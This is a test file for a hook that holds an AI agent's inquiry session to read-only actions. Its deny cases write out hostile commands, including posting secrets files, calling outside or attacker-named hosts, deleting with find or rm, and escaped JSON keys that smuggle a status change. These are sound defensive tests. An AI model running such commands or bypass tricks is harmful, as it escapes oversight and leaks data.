import { describe, expect, it } from "vitest";
import {
  inquiryReadOnly,
  inquirySubjectFromTriggeredBy,
  isInquiryTriggeredBy,
} from "./inquiry-readonly.js";
import type { HarnessAction } from "./predicates.js";

function action(overrides: Partial<HarnessAction> = {}): HarnessAction {
  return {
    tool: "Bash",
    readOnlyInquiry: true,
    inquiryCaseId: "case-1",
    inquiryApiBaseUrl: "http://127.0.0.1:11111",
    inquiryReadRoot: "E:/repo",
    inquiryAllowedRunIds: ["run-9"],
    cwd: "E:/repo",
    ...overrides,
  };
}

describe("isInquiryTriggeredBy", () => {
  it("recognises an inquiry launch key", () => {
    expect(isInquiryTriggeredBy("director-inquiry:step-1:stalled:2026-08-20")).toBe(true);
  });

  it("does not treat the implement-session key as an inquiry", () => {
    expect(isInquiryTriggeredBy("director-patrol:step-1")).toBe(false);
  });

  it("is false when there is no triggered_by", () => {
    expect(isInquiryTriggeredBy(null)).toBe(false);
    expect(isInquiryTriggeredBy(undefined)).toBe(false);
  });
});

describe("inquiryReadOnly", () => {
  it("does not touch sessions that are not inquiries", () => {
    expect(inquiryReadOnly(action({ readOnlyInquiry: false, tool: "Edit", filePath: "/repo/a.ts" }))).toBeNull();
    expect(inquiryReadOnly(action({ readOnlyInquiry: undefined, tool: "Edit", filePath: "/repo/a.ts" }))).toBeNull();
  });

  it("denies file edits from an inquiry session", () => {
    const hit = inquiryReadOnly(action({ tool: "Edit", filePath: "/repo/a.ts" }));
    expect(hit?.decision).toBe("deny");
    expect(hit?.rule).toBe("inquiry-read-only");
  });

  it("rejects a prefix-only spoof and extracts the subject from a complete key", () => {
    expect(isInquiryTriggeredBy("director-inquiry:not-a-complete-key")).toBe(false);
    expect(inquirySubjectFromTriggeredBy("director-inquiry:step-1:run-failed:2026-08-20"))
      .toBe("step-1");
  });

  it.each(["Task", "mcp__concordia__delegation_invoke", "AskUserQuestion"])(
    "denies an unknown or write-capable tool %s",
    (tool) => {
      expect(inquiryReadOnly(action({ tool }))?.decision).toBe("deny");
    },
  );

  it.each([
    ["git commit -m x", "commit"],
    ["git push origin main", "push"],
    ["gh pr create --fill", "PR 作成"],
    ["npm run test", "テスト"],
    ["npx vitest run src/a.test.ts", "テスト実行"],
    ["curl -X POST http://127.0.0.1:11111/v1/delegation/invoke", "追加委託"],
    ["curl -X POST http://127.0.0.1:11111/v1/prs/local/abc/merge", "マージ"],
    ["curl -X POST http://127.0.0.1:11111/v1/admin/spawn-session", "任意 API 書き込み"],
    ["curl https://example.com/collect", "外部 endpoint"],
    ["curl -o dump.json http://127.0.0.1:11111/v1/director/cases/case-1", "HTTP のファイル書き込み"],
    ["curl -X POST http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1/decisions -d @secrets.json", "HTTP のファイル送信"],
    ["cat spec/a.md && rm spec/a.md", "shell command の連結"],
    ["git show HEAD:secret>copied.txt", "空白なし redirect"],
    ["git diff --output=copied.patch", "git output file"],
    ["curl -XPOST http://127.0.0.1:11111/v1/admin/settings", "compact write method"],
    ["curl -dBODY http://127.0.0.1:11111/v1/admin/settings", "compact implicit POST"],
    ["curl -L http://127.0.0.1:11111/v1/director/cases/case-1", "redirect following"],
    ["curl --proxy attacker.invalid:8080 http://127.0.0.1:11111/v1/director/cases/case-1", "proxy routing"],
    ["curl -XPOST 'http://127.0.0.1:11111/v1/admin/settings?next=/v1/director/cases/case-1/steps/step-1/decisions'", "route in query"],
    ["curl -XPOST 'http://127.0.0.1:11111/v1/admin/settings#/v1/director/cases/case-1/steps/step-1/decisions'", "route in fragment"],
    ["Get-Content spec/a.md & Remove-Item spec/a.md", "PowerShell call operator"],
    ["rg --pre 'dangerous-command' pattern .", "ripgrep preprocessor"],
    ["find . -exec dangerous-command {} +", "find exec"],
    ["find . -delete", "find delete"],
    ["git diff --ext-diff", "git external diff"],
    ["git grep --open-files-in-pager=dangerous-command pattern", "git external pager"],
    ["curl --request-target /v1/admin/settings -XPOST http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1/decisions", "HTTP request-target override"],
    ["curl http://127.0.0.1:11111/v1/admin/state", "unrelated same-origin GET"],
    ["curl http://127.0.0.1:11111/v1/director/cases/case-2", "another case GET"],
    ["curl http://127.0.0.1:11111/v1/delegation/runs/run-other", "unrelated run GET"],
    ["curl --config secrets.txt http://127.0.0.1:11111/v1/director/cases/case-1", "curl config file"],
    ["curl --header @secrets.txt http://127.0.0.1:11111/v1/director/cases/case-1", "curl header file"],
    ["curl --json @secrets.json http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1/decisions", "curl JSON file"],
    ["Invoke-RestMethod -Uri http://127.0.0.1:11111/v1/director/cases/case-1 -Body (Get-Content secrets.txt)", "PowerShell nested file read"],
    // shell の `>` は塞いであるので、curl 自身がファイルを作れる flag が残る唯一の
    // 書き込み経路になる。-o 以外の書き出し flag も同じ扱いにする。
    ["curl -D headers.txt http://127.0.0.1:11111/v1/director/cases/case-1", "header dump file"],
    ["curl --dump-header headers.txt http://127.0.0.1:11111/v1/director/cases/case-1", "header dump file (long)"],
    ["curl -c cookies.txt http://127.0.0.1:11111/v1/director/cases/case-1", "cookie jar file"],
    ["curl --cookie-jar cookies.txt http://127.0.0.1:11111/v1/director/cases/case-1", "cookie jar file (long)"],
    ["curl --trace trace.log http://127.0.0.1:11111/v1/director/cases/case-1", "trace file"],
    ["curl --trace-ascii trace.log http://127.0.0.1:11111/v1/director/cases/case-1", "trace-ascii file"],
    ["curl --stderr err.log http://127.0.0.1:11111/v1/director/cases/case-1", "stderr redirect file"],
    ["curl --etag-save etag.txt http://127.0.0.1:11111/v1/director/cases/case-1", "etag file"],
  ])("denies %s", (command) => {
    expect(inquiryReadOnly(action({ command }))?.decision).toBe("deny");
  });

  it.each([
    "curl -s http://127.0.0.1:11111/v1/director/cases/case-1",
    "curl -s http://127.0.0.1:11111/v1/delegation/runs/run-9",
  ])("allows the read-only command %s", (command) => {
    expect(inquiryReadOnly(action({ command }))).toBeNull();
  });

  it("allows file tools only inside the run's resolved target repo", () => {
    expect(inquiryReadOnly(action({ tool: "Read", filePath: "E:/repo/spec/feature/director.md" }))).toBeNull();
    expect(inquiryReadOnly(action({ tool: "Glob", filePath: "src/**/*.ts" }))).toBeNull();
    expect(inquiryReadOnly(action({ tool: "Read", filePath: "E:/other/private.txt" }))?.decision).toBe("deny");
    expect(inquiryReadOnly(action({ tool: "Read", cwd: "E:/repo/sub", filePath: "../../private.txt" }))?.decision).toBe("deny");
  });

  // Glob / Grep は探索パスを省略できる (既定は cwd)。hook が filePath を送れないその形を
  // 無条件 deny にすると、指示テンプレートが指示している調査手段が丸ごと使えなくなる。
  it("falls back to the cwd when a read-only tool reports no path", () => {
    expect(inquiryReadOnly(action({ tool: "Grep", filePath: undefined, cwd: "E:/repo" }))).toBeNull();
    expect(inquiryReadOnly(action({ tool: "Grep", filePath: undefined, cwd: "E:/other" }))?.decision).toBe("deny");
    expect(inquiryReadOnly(action({ tool: "Grep", filePath: undefined, cwd: undefined }))?.decision).toBe("deny");
  });

  it("denies filesystem reads when the inquiry launched without a resolved repo", () => {
    expect(inquiryReadOnly(action({ tool: "Read", filePath: "E:/repo/a.ts", inquiryReadRoot: undefined }))?.decision)
      .toBe("deny");
    expect(inquiryReadOnly(action({ command: "git show HEAD", inquiryReadRoot: undefined }))?.decision)
      .toBe("deny");
  });

  it("denies shell reads outside the resolved repo and non-git file commands", () => {
    expect(inquiryReadOnly(action({ command: "git show HEAD", cwd: "E:/other" }))?.decision).toBe("deny");
    expect(inquiryReadOnly(action({ command: "cat E:/repo/spec/feature/director.md" }))?.decision).toBe("deny");
  });

  it.each([
    "curl -X POST http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1/decisions -d '{\"kind\":\"design\"}'",
    "curl -X PATCH http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1 -d '{\"handoff_note\":\"fact\"}'",
  ])("allows the two inquiry API writes: %s", (command) => {
    expect(inquiryReadOnly(action({ command }))).toBeNull();
  });

  // 唯一の書き込み経路を「本文に丸括弧を書いた瞬間に閉じる」形にすると、問診セッションは
  // shell を持たないので原因不明のまま詰む。括弧は quote の外にあるときだけ実行される。
  it("allows parentheses inside the quoted JSON body", () => {
    const command = "curl -X POST http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1/decisions"
      + " -d '{\"kind\":\"design\",\"question\":\"A (推奨) か B か\"}'";
    expect(inquiryReadOnly(action({ command }))).toBeNull();
  });

  it("still denies parentheses outside quotes and an unbalanced quote", () => {
    expect(inquiryReadOnly(action({
      command: "curl -X POST http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1/decisions -d (cat body.json)",
    }))?.decision).toBe("deny");
    expect(inquiryReadOnly(action({
      command: "curl -X POST http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1/decisions -d '{\"kind\":\"design\"}",
    }))?.decision).toBe("deny");
  });

  it("denies changing step status through the otherwise allowed PATCH route", () => {
    const command = "curl -X PATCH http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1 -d '{\"status\":\"completed\"}'";
    expect(inquiryReadOnly(action({ command }))?.decision).toBe("deny");
  });

  it("denies an escaped status key and PATCH requests without a handoff field", () => {
    const escaped = String.raw`curl -X PATCH http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1 -d '{"handoff_note":"x","st\u0061tus":"completed"}'`;
    expect(inquiryReadOnly(action({ command: escaped }))?.decision).toBe("deny");
    expect(inquiryReadOnly(action({
      command: "curl -X PATCH http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1 -d '{}'",
    }))?.decision).toBe("deny");
  });

  // 問診セッションは shell を持たず deny の理由を自己診断できない。値の中にたまたま
  // "status:" を含む正当な handoff_note まで拒否すると原因不明で詰むため、キー位置だけを見る。
  it("allows a handoff note whose text merely mentions a status", () => {
    const command = "curl -X PATCH http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1"
      + " -d '{\"handoff_note\":\"run status: failed\"}'";
    expect(inquiryReadOnly(action({ command }))).toBeNull();
  });

  it("still denies a status key that follows another field", () => {
    const command = "curl -X PATCH http://127.0.0.1:11111/v1/director/cases/case-1/steps/step-1"
      + " -d '{\"handoff_note\":\"x\",\"status\":\"completed\"}'";
    expect(inquiryReadOnly(action({ command }))?.decision).toBe("deny");
  });

  // body flag の前方一致が広すぎると、GET のつもりの読み取りが POST 扱いで拒否される。
  it("does not mistake an unrelated long flag for a request body", () => {
    expect(inquiryReadOnly(action({
      command: "curl --compressed http://127.0.0.1:11111/v1/director/cases/case-1",
    }))).toBeNull();
  });

  // 逆方向の回帰: 値が直結する短縮形と、body を伴う長い形は POST として拒否し続ける。
  it.each([
    "curl -dBODY http://127.0.0.1:11111/v1/admin/settings",
    "curl --data-ascii x http://127.0.0.1:11111/v1/admin/settings",
    "curl --form-string a=b http://127.0.0.1:11111/v1/admin/settings",
  ])("still treats %s as a write", (command) => {
    expect(inquiryReadOnly(action({ command }))?.decision).toBe("deny");
  });

  it("denies writing to another Director case", () => {
    const command = "curl -X POST http://127.0.0.1:11111/v1/director/cases/case-2/steps/step-2/decisions -d '{\"kind\":\"design\"}'";
    expect(inquiryReadOnly(action({ command }))?.decision).toBe("deny");
  });

  it("denies an allowed-looking path on another origin", () => {
    const command = "curl -X POST https://example.com/v1/director/cases/case-1/steps/step-1/decisions -d '{\"kind\":\"design\"}'";
    expect(inquiryReadOnly(action({ command }))?.decision).toBe("deny");
  });

  it("does not enforce when there is no command to inspect", () => {
    expect(inquiryReadOnly(action({ command: undefined }))).toBeNull();
  });
});
